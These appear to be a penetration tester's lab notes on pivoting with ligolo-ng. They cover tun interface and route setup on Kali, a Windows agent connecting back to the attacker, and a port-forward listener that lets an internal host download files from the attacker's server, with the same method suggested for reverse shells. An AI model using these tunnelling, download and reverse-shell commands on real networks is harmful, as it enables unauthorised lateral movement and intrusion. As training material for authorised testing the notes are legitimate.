ALWAYS USE THIS METHOD FIRST TO LATERAL MOVEMENT
## Before starting
Transfer the following files:
If target is Windows, agent.exe
If target is linux, agent

## How to Setup
```
On Kali,
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add [whatever subnet you want] dev ligolo

Reuse ip route if there are more

Start the proxy with ./proxy -selfcert

On Windows,
.\agent.exe -connect $kaliip:11601 -ignore-cert

Go back to Kali,
session
select the session number 
start
```

## Local Port Forwarding with Ligolo
https://medium.com/@Thigh_GoD/ligolo-ng-finally-adds-local-port-forwarding-5bf9b19609f9
```
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 240.0.0.1/32 dev ligolo
```

## Take note when trying to access from internal to kali
Mindset : Let's say you want to download a file from your KALI like usual where you opened this -> 
python3 -m http.server 80
  !
You have opened server on 192.168.45.203:80   , but MS02 ONLY reaches MS01 , so you need to port forward . 
To make thing simple for myself I added a listener that does this port forwarding MS:80 to KALI:80 , looks like  this on session 1 (where MS01 is connected)-> 
```
listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp
```

How to reach Kali IP now to download something? On MS02 a command like this -> wget MS01:80 , and will redirect to KALI:80 .. 
In your care (just as an example, don't take it blindly copy paste),
```
powershell wget http://10.10.123.148:80/test
```

And that's it .. 

SAME goes for let's say a reverse shell .. add a new listener but with port 443 for example , and so on! 

